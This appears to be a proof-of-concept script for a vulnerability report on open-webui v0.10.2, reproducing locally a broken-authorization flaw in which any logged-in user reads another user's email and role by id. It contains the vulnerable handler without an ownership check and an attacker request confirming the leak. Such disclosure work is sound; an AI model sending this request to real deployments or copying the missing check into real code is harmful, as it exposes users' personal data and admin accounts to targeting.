"""
PoC — Broken Object-Level Authorization / excessive data exposure
open-webui v0.10.2 — GET /api/v1/users/{user_id}/info

This harness reproduces the EXACT vulnerable code path faithfully:
  * `UserInfoResponse` is copied VERBATIM from
        backend/open_webui/models/users.py:198-211
  * the request handler body is copied VERBATIM from
        backend/open_webui/routers/users.py:491-510
  * `get_verified_user` mirrors the real dependency: it authenticates the
    caller as SOME logged-in, non-pending user and performs NO check that the
    caller owns / is related to the {user_id} being requested.

Result: any authenticated low-privilege user can read ANY other user's
`email` and `role` (plus bio/status/groups) by user id — no shared chat,
channel, or group required. `role` also lets an attacker enumerate which
accounts are admins for follow-on targeting.

Run:  python poc_users_info_idor.py
"""

from fastapi import FastAPI, Depends, HTTPException, Header, status
from fastapi.testclient import TestClient
from pydantic import BaseModel


# --- VERBATIM from models/users.py:198-211 --------------------------------
class UserStatus(BaseModel):
    status_emoji: str | None = None
    status_message: str | None = None
    status_expires_at: int | None = None


class UserInfoResponse(UserStatus):
    id: str
    name: str
    email: str          # <-- sensitive, returned to any caller
    role: str           # <-- sensitive, returned to any caller
    bio: str | None = None
    groups: list | None = []
    is_active: bool = False
# --------------------------------------------------------------------------


# In-memory stand-ins for the real DB models / helpers.
class FakeUser(BaseModel):
    id: str
    name: str
    email: str
    role: str
    bio: str | None = None
    status_emoji: str | None = None
    status_message: str | None = None
    status_expires_at: int | None = None


USERS = {
    "attacker-uuid": FakeUser(
        id="attacker-uuid", name="Mallory", email="mallory@corp.example",
        role="user",  # low-privilege, freshly registered
    ),
    "victim-admin-uuid": FakeUser(
        id="victim-admin-uuid", name="Alice Admin",
        email="alice.admin@corp.example",  # sensitive
        role="admin",                       # sensitive
        bio="Head of IT",
    ),
}

TOKENS = {"attacker-token": "attacker-uuid"}  # attacker's own session


class Users:
    @staticmethod
    def get_user_by_id(uid):
        return USERS.get(uid)

    @staticmethod
    def is_user_active(uid):
        return True


class Groups:
    @staticmethod
    def get_groups_by_member_id(uid):
        return []


# Mirrors utils/auth.py get_verified_user: proves caller is a logged-in,
# non-pending user. It does NOT bind the caller to the requested {user_id}.
async def get_verified_user(authorization: str | None = Header(default=None)):
    token = (authorization or "").removeprefix("Bearer ")
    uid = TOKENS.get(token)
    if uid is None:
        raise HTTPException(status_code=401, detail="Not authenticated")
    return USERS[uid]


app = FastAPI()


# ===== VERBATIM handler body from routers/users.py:491-510 =================
@app.get("/api/v1/users/{user_id}/info", response_model=UserInfoResponse)
async def get_user_info_by_id(user_id: str, user=Depends(get_verified_user)):
    user = Users.get_user_by_id(user_id)          # NOTE: no ownership/access check
    if user:
        groups = Groups.get_groups_by_member_id(user_id)
        return UserInfoResponse(
            **{
                **user.model_dump(),
                "groups": [{"id": g["id"], "name": g["name"]} for g in groups],
                "is_active": Users.is_user_active(user_id),
            }
        )
    else:
        raise HTTPException(status_code=400, detail="User not found")
# ==========================================================================


if __name__ == "__main__":
    c = TestClient(app)
    # Attacker is authenticated only as themselves (role=user).
    # They request a DIFFERENT user's id (an admin they have no relationship to).
    r = c.get(
        "/api/v1/users/victim-admin-uuid/info",
        headers={"Authorization": "Bearer attacker-token"},
    )
    print("HTTP", r.status_code)
    body = r.json()
    print("Response body:", body)
    assert r.status_code == 200, "expected 200"
    assert body["email"] == "alice.admin@corp.example", "victim email leaked"
    assert body["role"] == "admin", "victim role leaked"
    print("\n[LEAK CONFIRMED] A role=user caller retrieved another user's "
          f"email={body['email']!r} and role={body['role']!r} "
          "with no ownership/relationship check.")
